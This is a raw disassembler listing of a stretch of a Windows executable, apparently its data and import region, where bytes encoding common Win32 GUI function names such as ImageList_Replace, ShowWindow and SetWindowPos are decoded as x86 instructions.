  428077:	imul   eax,DWORD PTR [eax],0x650000
  42807d:	js     0x42807f
  42807f:	jae    0x428081
  428081:	outs   dx,DWORD PTR ds:[esi]
  428082:	add    BYTE PTR [ebx+0x0],dh
  428085:	popa   
  428086:	add    BYTE PTR [esi+0x0],ch
  428089:	je     0x42808b
  42808b:	add    BYTE PTR [eax],al
  42808d:	bound  eax,QWORD PTR [eax]
  42808f:	jns    0x428091
  428091:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  428096:	add    BYTE PTR [eax+eax*1+0x74],ah
  42809a:	add    BYTE PTR [ecx+0x0],ah
  42809d:	add    BYTE PTR [eax],al
  42809f:	js     0x4280a1
  4280a1:	imul   eax,DWORD PTR [eax],0x610054
  4280a7:	imul   eax,DWORD PTR [eax],0x48006e
  4280ad:	popa   
  4280ae:	add    BYTE PTR [esi+0x0],ch
  4280b1:	add    BYTE PTR fs:[eax],al
  4280b4:	add    BYTE PTR [edi+0x0],cl
  4280b7:	ja     0x4280b9
  4280b9:	ins    BYTE PTR es:[edi],dx
  4280ba:	add    BYTE PTR [ebx+0x0],dh
  4280bd:	popa   
  4280be:	add    BYTE PTR [ebx+0x0],dh
  4280c1:	jo     0x4280c3
  4280c3:	popa   
  4280c4:	add    BYTE PTR [ecx+0x0],ch
  4280c7:	imul   eax,DWORD PTR [eax],0x72
  4280ca:	add    BYTE PTR [ebp+0x0],ah
  4280cd:	jbe    0x4280cf
  4280cf:	add    BYTE PTR [eax],al
  4280d1:	jb     0x4280d3
  4280d3:	jne    0x4280d5
  4280d5:	je     0x4280d7
  4280d7:	ins    DWORD PTR es:[edi],dx
  4280d8:	add    BYTE PTR [ebp+0x0],dh
  4280db:	arpl   WORD PTR [eax],ax
  4280dd:	jne    0x4280df
  4280df:	jo     0x4280e1
  4280e1:	add    BYTE PTR [eax],al
  4280e3:	jae    0x4280e5
  4280e5:	outs   dx,DWORD PTR ds:[esi]
  4280e6:	add    BYTE PTR [esi+0x0],ah
  4280e9:	imul   eax,DWORD PTR [eax],0x630062
  4280ef:	outs   dx,DWORD PTR ds:[esi]
  4280f0:	add    BYTE PTR [ecx+0x0],ch
  4280f3:	jb     0x4280f5
  4280f5:	jae    0x4280f7
  4280f7:	outs   dx,DWORD PTR ds:[esi]
  4280f8:	add    BYTE PTR [eax],al
  4280fa:	add    BYTE PTR [ebx+0x0],dl
  4280fd:	outs   dx,DWORD PTR ds:[esi]
  4280fe:	add    BYTE PTR [ebx+0x0],ah
  428101:	popa   
  428102:	add    BYTE PTR [ecx+0x0],ch
  428105:	jae    0x428107
  428107:	data16 add BYTE PTR [ecx+0x0],ah
  42810b:	jb     0x42810d
  42810d:	popa   
  42810e:	add    BYTE PTR [ecx+0x0],ch
  428111:	add    BYTE PTR [eax],al
  428113:	add    BYTE PTR [esi],cl
  428115:	adc    BYTE PTR [eax],al
  428117:	out    0x67,eax
  428119:	adc    BYTE PTR [eax],al
  42811b:	js     0x428144
  42811d:	adc    BYTE PTR [eax],al
  42811f:	test   al,0x13
  428121:	adc    BYTE PTR [eax],al
  428123:	fs push esi
  428125:	adc    BYTE PTR [eax],al
  428127:	jp     0x428149
  428129:	adc    BYTE PTR [eax],al
  42812b:	enter  0x1052,0x0
  42812f:	loop   0x4281a4
  428131:	adc    BYTE PTR [eax],al
  428133:	ja     0x4281a0
  428135:	adc    BYTE PTR [eax],al
  428137:	cmp    al,0x2b
  428139:	adc    BYTE PTR [eax],al
  42813b:	rcl    BYTE PTR [edx],1
  42813d:	adc    BYTE PTR [eax],al
  42813f:	sbb    DWORD PTR [eax+0x10],ebx
  428142:	add    BYTE PTR [esi],ah
  428144:	add    dl,BYTE PTR [eax]
  428146:	add    BYTE PTR [edi+0xc],dh
  428149:	adc    BYTE PTR [eax],al
  42814b:	mov    dh,BYTE PTR [ecx]
  42814d:	adc    BYTE PTR [eax],al
  42814f:	out    dx,al
  428150:	sbb    eax,0xed80010
  428155:	adc    BYTE PTR [eax],al
  428157:	add    eax,0x3300107f
  42815c:	jbe    0x42816e
  42815e:	add    BYTE PTR [ebx],dl
  428160:	add    DWORD PTR [edx+0x0],0x428117
  428167:	sbb    eax,DWORD PTR [ecx-0x7ee0ffbe]
  42816d:	inc    edx
  42816e:	add    BYTE PTR [ebx],ah
  428170:	add    DWORD PTR [edx+0x0],0x428127
  428177:	sub    eax,DWORD PTR [ecx-0x7ed0ffbe]
  42817d:	inc    edx
  42817e:	add    BYTE PTR [ebx],dh
  428180:	add    DWORD PTR [edx+0x0],0x428137
  428187:	cmp    eax,DWORD PTR [ecx-0x7ec0ffbe]
  42818d:	inc    edx
  42818e:	add    BYTE PTR [ebx-0x7f],al
  428191:	inc    edx
  428192:	add    BYTE PTR [edi-0x7f],al
  428195:	inc    edx
  428196:	add    BYTE PTR [ebx-0x7f],cl
  428199:	inc    edx
  42819a:	add    BYTE PTR [edi-0x7f],cl
  42819d:	inc    edx
  42819e:	add    BYTE PTR [ebx-0x7f],dl
  4281a1:	inc    edx
  4281a2:	add    BYTE PTR [edi-0x7f],dl
  4281a5:	inc    edx
  4281a6:	add    BYTE PTR [ebx-0x7f],bl
  4281a9:	inc    edx
  4281aa:	add    bl,ch
  4281ac:	add    DWORD PTR [edx+0x0],0x4281ef
  4281b3:	repz add DWORD PTR [edx+0x0],0x4281f7
  4281bb:	sti    
  4281bc:	add    DWORD PTR [edx+0x0],0x4281ff
  4281c3:	add    eax,DWORD PTR [edx-0x7df8ffbe]
  4281c9:	inc    edx
  4281ca:	add    BYTE PTR [ebx],cl
  4281cc:	add    BYTE PTR [edx+0x0],0xf
  4281d0:	add    BYTE PTR [edx+0x0],0x13
  4281d4:	add    BYTE PTR [edx+0x0],0x17
  4281d8:	add    BYTE PTR [edx+0x0],0x1b
  4281dc:	add    BYTE PTR [edx+0x0],0x1f
  4281e0:	add    BYTE PTR [edx+0x0],0x23
  4281e4:	add    BYTE PTR [edx+0x0],0x27
  4281e8:	add    BYTE PTR [edx+0x0],0x29
  4281ec:	or     al,0x10
  4281ee:	add    BYTE PTR [edx-0x57ffefc2],dl
  4281f4:	push   edi
  4281f5:	adc    BYTE PTR [eax],al
  4281f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4281f8:	outs   dx,DWORD PTR ds:[esi]
  4281f9:	adc    BYTE PTR [eax],al
  4281fb:	push   ebx
  4281fc:	popa   
  4281fd:	adc    BYTE PTR [eax],al
  4281ff:	add    dh,BYTE PTR [ebp+0x10]
  428202:	add    dh,cl
  428204:	jle    0x428216
  428206:	add    BYTE PTR [esi+edx*2],dl
  428209:	adc    BYTE PTR [eax],al
  42820b:	mov    al,0x68
  42820d:	adc    BYTE PTR [eax],al
  42820f:	aas    
  428210:	inc    esp
  428211:	adc    BYTE PTR [eax],al
  428213:	pop    ebp
  428214:	and    DWORD PTR [eax],edx
  428216:	add    bl,dl
  428218:	jl     0x42822a
  42821a:	add    BYTE PTR [edx+0xb],dh
  42821d:	adc    BYTE PTR [eax],al
  42821f:	inc    edx
  428220:	push   eax
  428221:	adc    BYTE PTR [eax],al
  428223:	mov    ebp,0xbb001074
  428228:	pop    ds
  428229:	adc    BYTE PTR [eax],al
  42822b:	sub    DWORD PTR [eax+0x10],eax
  42822e:	add    BYTE PTR [ecx],dh
  428230:	ja     0x428242
  428232:	add    bl,dl
  428234:	sbb    dl,BYTE PTR [eax]
  428236:	add    BYTE PTR [esi+0x1e],ch
  428239:	adc    BYTE PTR [eax],al
  42823b:	or     ch,BYTE PTR [esi]
  42823d:	adc    BYTE PTR [eax],al
  42823f:	sbb    eax,0xa100103e
  428244:	data16 adc BYTE PTR [eax],al
  428247:	xchg   ecx,eax
  428248:	bound  edx,QWORD PTR [eax]
  42824a:	add    BYTE PTR [esi],bh
  42824c:	dec    edi
  42824d:	adc    BYTE PTR [eax],al
  42824f:	in     eax,dx
  428250:	adc    BYTE PTR fs:[eax],al
  428253:	sub    bl,BYTE PTR [ecx+0x10]
  428256:	add    BYTE PTR [esi+0x43],al
  428259:	adc    BYTE PTR [eax],al
  42825b:	imul   edi,DWORD PTR [eax+edx*1],0x0
  42825f:	rol    BYTE PTR [esi+0x10],0x0
  428263:	in     eax,0x31
  428265:	adc    BYTE PTR [eax],al
  428267:	mov    esp,0x2b00104f
  42826c:	add    BYTE PTR [edx+0x0],0x2f
  428270:	add    BYTE PTR [edx+0x0],0x33
  428274:	add    BYTE PTR [edx+0x0],0x37
  428278:	add    BYTE PTR [edx+0x0],0x3b
  42827c:	add    BYTE PTR [edx+0x0],0x3f
  428280:	add    BYTE PTR [edx+0x0],0x43
  428284:	add    BYTE PTR [edx+0x0],0x47
  428288:	add    BYTE PTR [edx+0x0],0x4b
  42828c:	add    BYTE PTR [edx+0x0],0x4f
  428290:	add    BYTE PTR [edx+0x0],0x53
  428294:	add    BYTE PTR [edx+0x0],0x57
  428298:	add    BYTE PTR [edx+0x0],0x5b
  42829c:	add    BYTE PTR [edx+0x0],0x5f
  4282a0:	add    BYTE PTR [edx+0x0],0x63
  4282a4:	add    BYTE PTR [edx+0x0],0x67
  4282a8:	add    BYTE PTR [edx+0x0],0xe1
  4282ac:	and    dl,BYTE PTR [eax]
  4282ae:	add    bh,bh
  4282b0:	push   ecx
  4282b1:	adc    BYTE PTR [eax],al
  4282b3:	test   BYTE PTR ds:0x1d0c0010,0x10
  4282ba:	add    BYTE PTR [ebx],al
  4282bc:	sbb    dl,BYTE PTR [eax]
  4282be:	add    ch,ah
  4282c0:	or     dl,BYTE PTR [eax]
  4282c2:	add    BYTE PTR [edi+0x42001035],bl
  4282c8:	pop    edi
  4282c9:	adc    BYTE PTR [eax],al
  4282cb:	adc    eax,0xd300103f
  4282d0:	cmp    dl,BYTE PTR [eax]
  4282d2:	add    BYTE PTR [ebp+0x1001021],ah
  4282d8:	sbb    al,0x10
  4282da:	add    BYTE PTR [ebx-0x1effefd7],ch
  4282e0:	adc    BYTE PTR cs:[eax],al
  4282e3:	push   eax
  4282e4:	adc    BYTE PTR [bx+si],al
  4282e7:	mov    edi,0xab00102d
  4282ec:	add    BYTE PTR [edx+0x0],0xaf
  4282f0:	add    BYTE PTR [edx+0x0],0xb3
  4282f4:	add    BYTE PTR [edx+0x0],0xb7
  4282f8:	add    BYTE PTR [edx+0x0],0xbb
  4282fc:	add    BYTE PTR [edx+0x0],0xbf
  428300:	add    BYTE PTR [edx+0x0],0xc3
  428304:	add    BYTE PTR [edx+0x0],0xc7
  428308:	add    BYTE PTR [edx+0x0],0xcb
  42830c:	add    BYTE PTR [edx+0x0],0xcf
  428310:	add    BYTE PTR [edx+0x0],0xd3
  428314:	add    BYTE PTR [edx+0x0],0xd7
  428318:	add    BYTE PTR [edx+0x0],0xdb
  42831c:	add    BYTE PTR [edx+0x0],0xdf
  428320:	add    BYTE PTR [edx+0x0],0xe3
  428324:	add    BYTE PTR [edx+0x0],0xe7
  428328:	add    BYTE PTR [edx+0x0],0x98
  42832c:	pusha  
  42832d:	adc    BYTE PTR [eax],al
  42832f:	pop    ebp
  428330:	js     0x428342
  428332:	add    BYTE PTR [esi],bh
  428334:	dec    eax
  428335:	adc    BYTE PTR [eax],al
  428337:	cmp    al,0x7a
  428339:	adc    BYTE PTR [eax],al
  42833b:	aam    0x9
  42833d:	adc    BYTE PTR [eax],al
  42833f:	or     cl,BYTE PTR [ebx]
  428341:	adc    BYTE PTR [eax],al
  428343:	pop    ebx
  428344:	push   ebp
  428345:	adc    BYTE PTR [eax],al
  428347:	mov    esi,0x6001032
  42834c:	xor    edx,DWORD PTR [eax]
  42834e:	add    BYTE PTR [esi-0x16ffefc0],al
  428354:	and    eax,0x61460010
  428359:	adc    BYTE PTR [eax],al
  42835b:	adc    DWORD PTR [ebp+0x10],ebp
  42835e:	add    al,al
  428360:	dec    esi
  428361:	adc    BYTE PTR [eax],al
  428363:	jae    0x428383
  428365:	adc    BYTE PTR [eax],al
  428367:	dec    ebx
  428368:	add    eax,0x832b0010
  42836d:	inc    edx
  42836e:	add    BYTE PTR [edi],ch
  428370:	add    DWORD PTR [edx+0x0],0x33
  428374:	add    DWORD PTR [edx+0x0],0x37
  428378:	add    DWORD PTR [edx+0x0],0x3b
  42837c:	add    DWORD PTR [edx+0x0],0x3f
  428380:	add    DWORD PTR [edx+0x0],0x43
  428384:	add    DWORD PTR [edx+0x0],0x47
  428388:	add    DWORD PTR [edx+0x0],0x4b
  42838c:	add    DWORD PTR [edx+0x0],0x4f
  428390:	add    DWORD PTR [edx+0x0],0x53
  428394:	add    DWORD PTR [edx+0x0],0x57
  428398:	add    DWORD PTR [edx+0x0],0x5b
  42839c:	add    DWORD PTR [edx+0x0],0x5f
  4283a0:	add    DWORD PTR [edx+0x0],0x63
  4283a4:	add    DWORD PTR [edx+0x0],0x67
  4283a8:	add    DWORD PTR [edx+0x0],0x0
	...
  4283b4:	cmp    dh,BYTE PTR [ecx+0x52]
  4283b7:	dec    edi
  4283b8:	add    BYTE PTR [eax],al
  4283ba:	add    BYTE PTR [eax],al
  4283bc:	adc    BYTE PTR [ebp+0x10002],cl
  4283c2:	add    BYTE PTR [eax],al
  4283c4:	add    DWORD PTR [eax],eax
  4283c6:	add    BYTE PTR [eax],al
  4283c8:	add    DWORD PTR [eax],eax
  4283ca:	add    BYTE PTR [eax],al
  4283cc:	loopne 0x42835a
  4283ce:	add    al,BYTE PTR [eax]
  4283d0:	add    BYTE PTR [ebp-0x730ffffe],cl
  4283d6:	add    al,BYTE PTR [eax]
	...
  4283e4:	test   al,0x85
  4283e6:	add    al,BYTE PTR [eax]
  4283e8:	les    eax,FWORD PTR [ebp-0x7a29fffe]
  4283ee:	add    al,BYTE PTR [eax]
  4283f0:	call   0x42867a
  4283f5:	xchg   BYTE PTR [edx],al
  4283f7:	add    BYTE PTR [esi+eax*4],dl
  4283fa:	add    al,BYTE PTR [eax]
  4283fc:	xchg   BYTE PTR cs:[edx],al
  4283ff:	add    BYTE PTR [eax],al
  428401:	add    BYTE PTR [eax],al
  428403:	add    BYTE PTR [eax-0x7a],dl
  428406:	add    al,BYTE PTR [eax]
  428408:	outs   dx,BYTE PTR ds:[esi]
  428409:	xchg   BYTE PTR [edx],al
  42840b:	add    BYTE PTR [esi+eax*4+0x2],bh
  42840f:	add    BYTE PTR [edx-0x61fffd7a],cl
  428415:	xchg   BYTE PTR [edx],al
  428417:	add    BYTE PTR [esi+eax*4-0x7941fffe],ch
  42841e:	add    al,BYTE PTR [eax]
  428420:	rol    BYTE PTR [esi-0x7921fffe],1
  428426:	add    al,BYTE PTR [eax]
  428428:	lock xchg BYTE PTR [edx],al
  42842b:	add    BYTE PTR [edx],al
  42842d:	xchg   DWORD PTR [edx],eax
  42842f:	add    BYTE PTR [eax],dl
  428431:	xchg   DWORD PTR [edx],eax
  428433:	add    BYTE PTR [esi],bl
  428435:	xchg   DWORD PTR [edx],eax
  428437:	add    BYTE PTR [eax],dh
  428439:	xchg   DWORD PTR [edx],eax
  42843b:	add    BYTE PTR [edi+eax*4],bh
  42843e:	add    al,BYTE PTR [eax]
  428440:	push   edx
  428441:	xchg   DWORD PTR [edx],eax
  428443:	add    BYTE PTR [edi+eax*4+0x2],ah
  428447:	add    BYTE PTR [esi-0x79],dh
  42844a:	add    al,BYTE PTR [eax]
  42844c:	add    BYTE PTR [edi-0x786dfffe],0x2
  428453:	add    BYTE PTR [edx-0x47fffd79],ah
  428459:	xchg   DWORD PTR [edx],eax
  42845b:	add    ah,al
  42845d:	xchg   DWORD PTR [edx],eax
  42845f:	add    dh,dl
  428461:	xchg   DWORD PTR [edx],eax
  428463:	add    ah,ch
  428465:	xchg   DWORD PTR [edx],eax
  428467:	add    dh,bh
  428469:	xchg   DWORD PTR [edx],eax
  42846b:	add    BYTE PTR [eax+ecx*4],cl
  42846e:	add    al,BYTE PTR [eax]
  428470:	sbb    al,0x88
  428472:	add    al,BYTE PTR [eax]
  428474:	mov    BYTE PTR cs:[edx],al
  428477:	add    BYTE PTR [edx-0x78],al
  42847a:	add    al,BYTE PTR [eax]
  42847c:	pop    eax
  42847d:	mov    BYTE PTR [edx],al
  42847f:	add    BYTE PTR [edx-0x78],ch
  428482:	add    al,BYTE PTR [eax]
  428484:	jl     0x42840e
  428486:	add    al,BYTE PTR [eax]
  428488:	mov    WORD PTR [eax-0x7763fffe],cs
  42848e:	add    al,BYTE PTR [eax]
  428490:	lods   al,BYTE PTR ds:[esi]
  428491:	mov    BYTE PTR [edx],al
  428493:	add    BYTE PTR [esi-0x33fffd78],bh
  428499:	mov    BYTE PTR [edx],al
  42849b:	add    dl,bl
  42849d:	mov    BYTE PTR [edx],al
  42849f:	add    dl,dh
  4284a1:	mov    BYTE PTR [edx],al
  4284a3:	add    BYTE PTR [ecx+ecx*4],al
  4284a6:	add    al,BYTE PTR [eax]
  4284a8:	push   ss
  4284a9:	mov    DWORD PTR [edx],eax
  4284ab:	add    BYTE PTR [edx],ah
  4284ad:	mov    DWORD PTR [edx],eax
  4284af:	add    BYTE PTR [esi],ch
  4284b1:	mov    DWORD PTR [edx],eax
  4284b3:	add    BYTE PTR [edx],bh
  4284b5:	mov    DWORD PTR [edx],eax
  4284b7:	add    BYTE PTR [edx-0x77],cl
  4284ba:	add    al,BYTE PTR [eax]
  4284bc:	pusha  
  4284bd:	mov    DWORD PTR [edx],eax
  4284bf:	add    BYTE PTR [esi-0x77],ch
  4284c2:	add    al,BYTE PTR [eax]
  4284c4:	or     BYTE PTR [ecx-0x766dfffe],0x2
  4284cb:	add    BYTE PTR [eax],al
  4284cd:	add    BYTE PTR [eax],al
  4284cf:	add    BYTE PTR [ecx+ecx*4+0x2],ch
  4284d6:	add    BYTE PTR [eax],al
  4284d8:	retf   0x289
  4284db:	add    ah,bl
  4284dd:	mov    DWORD PTR [edx],eax
  4284df:	add    dh,ch
  4284e1:	mov    DWORD PTR [edx],eax
  4284e3:	add    BYTE PTR [edx+ecx*4],al
  4284e6:	add    al,BYTE PTR [eax]
  4284e8:	push   ss
  4284e9:	mov    al,BYTE PTR [edx]
  4284eb:	add    BYTE PTR [eax],ch
  4284ed:	mov    al,BYTE PTR [edx]
  4284ef:	add    BYTE PTR [eax],bh
  4284f1:	mov    al,BYTE PTR [edx]
  4284f3:	add    BYTE PTR [esi-0x76],dl
  4284f6:	add    al,BYTE PTR [eax]
  4284f8:	data16 mov al,BYTE PTR [edx]
  4284fb:	add    BYTE PTR [edx+ecx*4+0x2],dh
  4284ff:	add    BYTE PTR [edx+ecx*4-0x756dfffe],al
  428506:	add    al,BYTE PTR [eax]
  428508:	mov    ds:0xae00028a,al
  42850d:	mov    al,BYTE PTR [edx]
  42850f:	add    al,al
  428511:	mov    al,BYTE PTR [edx]
  428513:	add    dl,dl
  428515:	mov    al,BYTE PTR [edx]
  428517:	add    al,ch
  428519:	mov    al,BYTE PTR [edx]
  42851b:	add    dh,dh
  42851d:	mov    al,BYTE PTR [edx]
  42851f:	add    BYTE PTR [edx],al
  428521:	mov    eax,DWORD PTR [edx]
  428523:	add    BYTE PTR [ebx+ecx*4],bl
  428526:	add    al,BYTE PTR [eax]
  428528:	xor    al,0x8b
  42852a:	add    al,BYTE PTR [eax]
  42852c:	dec    esp
  42852d:	mov    eax,DWORD PTR [edx]
  42852f:	add    BYTE PTR [edx-0x75],bl
  428532:	add    al,BYTE PTR [eax]
  428534:	mov    ax,WORD PTR [edx]
  428537:	add    BYTE PTR [eax-0x75],bh
  42853a:	add    al,BYTE PTR [eax]
  42853c:	add    BYTE PTR [eax],al
  42853e:	add    BYTE PTR [eax],al
  428540:	cwde   
  428541:	mov    eax,DWORD PTR [edx]
  428543:	add    BYTE PTR [edx-0x4ffffd75],ah
  428549:	mov    eax,DWORD PTR [edx]
  42854b:	add    BYTE PTR [ebx+ecx*4-0x7433fffe],bh
  428552:	add    al,BYTE PTR [eax]
  428554:	fimul  DWORD PTR [ebx-0x7419fffe]
  42855a:	add    al,BYTE PTR [eax]
  42855c:	lock mov eax,DWORD PTR [edx]
  42855f:	add    BYTE PTR [edx],al
  428561:	mov    WORD PTR [edx],es
  428563:	add    BYTE PTR [eax],bl
  428565:	mov    WORD PTR [edx],es
  428567:	add    BYTE PTR [esi],ch
  428569:	mov    WORD PTR [edx],es
  42856b:	add    BYTE PTR [esp+ecx*4+0x2],al
  42856f:	add    BYTE PTR [esp+ecx*4+0x2],dl
  428573:	add    BYTE PTR [esp+ecx*4+0x2],ah
  428577:	add    BYTE PTR [esp+ecx*4+0x2],dh
  42857b:	add    BYTE PTR [edx-0x65fffd74],al
  428581:	mov    WORD PTR [edx],es
  428583:	add    BYTE PTR [esp+ecx*4-0x734ffffe],ah
  42858a:	add    al,BYTE PTR [eax]
  42858c:	mov    esi,0x28c
	...
  42859d:	add    BYTE PTR [eax],al
  42859f:	add    BYTE PTR [ebx+0x6d],ah
  4285a2:	fs cs gs js 0x42860c
  4285a7:	add    BYTE PTR [edi],dl
  4285a9:	add    BYTE PTR [ebp+eiz*2+0x73],al
  4285ad:	je     0x428621
  4285af:	outs   dx,DWORD PTR ds:[esi]
  4285b0:	jns    0x428602
  4285b2:	jb     0x428623
  4285b4:	jo     0x42861b
  4285b6:	jb     0x42862c
  4285b8:	jns    0x42860d
  4285ba:	push   0x50746565
  4285bf:	popa   
  4285c0:	add    BYTE PTR gs:[bx+si],al
  4285c4:	pop    esp
  4285c5:	add    BYTE PTR [eax+0x72],dl
  4285c8:	outs   dx,DWORD PTR ds:[esi]
  4285c9:	jo     0x428630
  4285cb:	jb     0x428641
  4285cd:	jns    0x428622
  4285cf:	push   0x57746565
  4285d4:	add    BYTE PTR [eax],al
  4285d6:	pop    ebx
  4285d7:	add    BYTE PTR [eax+0x72],dl
  4285da:	outs   dx,DWORD PTR ds:[esi]
  4285db:	jo     0x428642
  4285dd:	jb     0x428653
  4285df:	jns    0x428634
  4285e1:	push   0x41746565
  4285e6:	add    BYTE PTR [eax],al
  4285e8:	dec    esi
  4285e9:	add    BYTE PTR [ecx+0x6d],cl
  4285ec:	popa   
  4285ed:	addr16 gs dec esp
  4285f0:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  4285f7:	ins    BYTE PTR es:[edi],dx
  4285f8:	popa   
  4285f9:	arpl   WORD PTR [ebp+0x49],sp
  4285fc:	arpl   WORD PTR [edi+0x6e],bp
  4285ff:	add    BYTE PTR [ecx],dh
  428601:	add    BYTE PTR [ecx+0x6d],cl
  428604:	popa   
  428605:	addr16 gs dec esp
  428608:	imul   esi,DWORD PTR [ebx+0x74],0x7365445f
  42860f:	je     0x428683
  428611:	outs   dx,DWORD PTR ds:[esi]
  428612:	jns    0x428614
  428614:	inc    eax
  428615:	add    BYTE PTR [ecx+0x6d],cl
  428618:	popa   
  428619:	addr16 gs dec esp
  42861c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  428623:	dec    ecx
  428624:	ins    DWORD PTR es:[edi],dx
  428625:	popa   
  428626:	addr16 gs inc ebx
  428629:	outs   dx,DWORD PTR ds:[esi]
  42862a:	jne    0x42869a
  42862c:	je     0x42862e
  42862e:	dec    esp
  42862f:	add    BYTE PTR [ecx+0x6d],cl
  428632:	popa   
  428633:	addr16 gs dec esp
  428636:	imul   esi,DWORD PTR [ebx+0x74],0x6d65525f
  42863d:	outs   dx,DWORD PTR ds:[esi]
  42863e:	jbe    0x4286a5
  428640:	add    BYTE PTR [eax],al
  428642:	inc    ebx
  428643:	dec    edi
  428644:	dec    ebp
  428645:	inc    ebx
  428646:	push   esp
  428647:	dec    esp
  428648:	xor    esi,DWORD PTR [edx]
  42864a:	cs fs ins BYTE PTR es:[edi],dx
  42864d:	ins    BYTE PTR es:[edi],dx
  42864e:	add    BYTE PTR [eax],al
  428650:	push   edi
  428651:	add    BYTE PTR [ebx+0x72],al
  428654:	gs popa 
  428656:	je     0x4286bd
  428658:	inc    esp
  428659:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  428660:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  428668:	jb     0x4286cb
  42866a:	ins    DWORD PTR es:[edi],dx
  42866b:	push   edi
  42866c:	add    BYTE PTR [eax],al
  42866e:	xor    al,BYTE PTR [edx]
  428670:	push   ebx
  428671:	gs je  0x4286b7
  428674:	popa   
  428675:	jb     0x4286dc
  428677:	je     0x4286c9
  428679:	outs   dx,DWORD PTR ds:[esi]
  42867a:	jae    0x42867c
  42867c:	cmp    al,BYTE PTR [ecx]
  42867e:	inc    edi
  42867f:	gs je  0x4286cf
  428682:	gs jae 0x4286f8
  428685:	popa   
  428686:	addr16 gs inc ecx
  428689:	add    BYTE PTR [edx+0x61724400],dh
  42868f:	ja     0x4286d7
  428691:	jb     0x4286f4
  428693:	ins    DWORD PTR es:[edi],dx
  428694:	gs inc ebx
  428696:	outs   dx,DWORD PTR ds:[esi]
  428697:	outs   dx,BYTE PTR ds:[esi]
  428698:	je     0x42870c
  42869a:	outs   dx,DWORD PTR ds:[esi]
  42869b:	ins    BYTE PTR es:[edi],dx
  42869c:	add    BYTE PTR [eax],al
  42869e:	sbb    BYTE PTR [ecx],al
  4286a0:	inc    edi
  4286a1:	gs je  0x4286ed
  4286a4:	arpl   WORD PTR [edi+0x6e],bp
  4286a7:	dec    ecx
  4286a8:	outs   dx,BYTE PTR ds:[esi]
  4286a9:	outs   dx,WORD PTR ds:[esi]
  4286ab:	add    bl,bh
  4286ad:	add    dl,BYTE PTR [edx+esi*2+0x61]
  4286b1:	arpl   WORD PTR [ebx+0x50],bp
  4286b4:	outs   dx,DWORD PTR ds:[esi]
  4286b5:	jo     0x42872c
  4286b7:	jo     0x428706
  4286b9:	outs   dx,BYTE PTR gs:[esi]
  4286bb:	jne    0x4286bd
  4286bd:	add    cl,bl
  4286bf:	add    DWORD PTR [ebp+0x6f],ecx
  4286c2:	outs   dx,BYTE PTR ds:[esi]
  4286c3:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  4286cb:	push   edx
  4286cc:	arpl   WORD PTR gs:[eax+eax*1+0x39],si
  4286d1:	add    BYTE PTR [ebx+0x68],al
  4286d4:	popa   
  4286d5:	jb     0x42872c
  4286d7:	jo     0x428749
  4286d9:	gs jb  0x428733
  4286dc:	add    BYTE PTR [eax],al
  4286de:	add    dl,BYTE PTR ds:[ebx+0x65]
  4286e2:	je     0x428728
  4286e4:	ins    BYTE PTR es:[edi],dx
  4286e5:	addr16 dec ecx
  4286e7:	je     0x42874e
  4286e9:	ins    DWORD PTR es:[edi],dx
  4286ea:	push   esp
  4286eb:	gs js  0x428762
  4286ee:	inc    ecx
  4286ef:	add    BYTE PTR [edx+eax*1+0x53],bh
  4286f3:	push   0x774f776f
  4286f8:	outs   dx,BYTE PTR ds:[esi]
  4286f9:	gs fs push eax
  4286fc:	outs   dx,DWORD PTR ds:[esi]
  4286fd:	jo     0x428774
  4286ff:	jo     0x428774
  428701:	add    BYTE PTR [eax],bl
  428703:	add    dl,BYTE PTR [edx+0x65]
  428706:	ins    DWORD PTR es:[edi],dx
  428707:	outs   dx,DWORD PTR ds:[esi]
  428708:	jbe    0x42876f
  42870a:	push   eax
  42870b:	jb     0x42877c
  42870d:	jo     0x428766
  42870f:	add    BYTE PTR [edi+0x2],bh
  428712:	push   ebx
  428713:	push   0x6957776f
  428718:	outs   dx,BYTE PTR ds:[esi]
  428719:	outs   dx,DWORD PTR fs:[esi]
  42871b:	ja     0x42871d
  42871d:	add    BYTE PTR [ebx],bl
  42871f:	add    BYTE PTR [ebx+0x61],al
  428722:	ins    BYTE PTR es:[edi],dx
  428723:	ins    BYTE PTR es:[edi],dx
  428724:	push   edi
  428725:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  42872c:	outs   dx,DWORD PTR ds:[esi]
  42872d:	arpl   WORD PTR [edi+0x0],dx
  428730:	mov    dh,0x1
  428732:	dec    esp
  428733:	outs   dx,DWORD PTR ds:[esi]
  428734:	popa   
  428735:	fs dec ebp
  428737:	outs   dx,BYTE PTR gs:[esi]
  428739:	jne    0x42877c
  42873b:	add    BYTE PTR [edx+eax*1+0x74697753],al
  428742:	arpl   WORD PTR [eax+0x54],bp
  428745:	outs   dx,DWORD PTR ds:[esi]
  428746:	push   esp
  428747:	push   0x69577369
  42874c:	outs   dx,BYTE PTR ds:[esi]
  42874d:	outs   dx,DWORD PTR fs:[esi]
  42874f:	ja     0x428751
  428751:	add    BYTE PTR [eax],ah
  428753:	add    dl,BYTE PTR [ebx+0x63]
  428756:	jb     0x4287c7
  428758:	ins    BYTE PTR es:[edi],dx
  428759:	ins    BYTE PTR es:[edi],dx
  42875a:	push   edi
  42875b:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  428762:	add    BYTE PTR [eax],al
  428764:	pop    DWORD PTR [eax]
  428766:	inc    esp
  428767:	gs push di
  42876a:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  428771:	outs   dx,DWORD PTR ds:[esi]
  428772:	arpl   WORD PTR [edi+0x0],dx
  428775:	add    BYTE PTR [ecx],dh
  428777:	add    BYTE PTR [ebx+0x68],al
  42877a:	popa   
  42877b:	jb     0x4287cd
  42877d:	jb     0x4287e4
  42877f:	jbe    0x4287d8
  428781:	add    BYTE PTR [edx+eax*1+0x696c6156],ch
  428788:	fs popa 
  42878a:	je     0x4287f1
  42878c:	push   edx
  42878d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  428792:	xor    eax,DWORD PTR [ecx]
  428794:	inc    edi
  428795:	gs je  0x4287e5
  428798:	outs   dx,BYTE PTR gs:[esi]
  42879a:	jne    0x4287e5
  42879c:	je     0x428803
  42879e:	ins    DWORD PTR es:[edi],dx
  42879f:	dec    ecx
  4287a0:	inc    esp
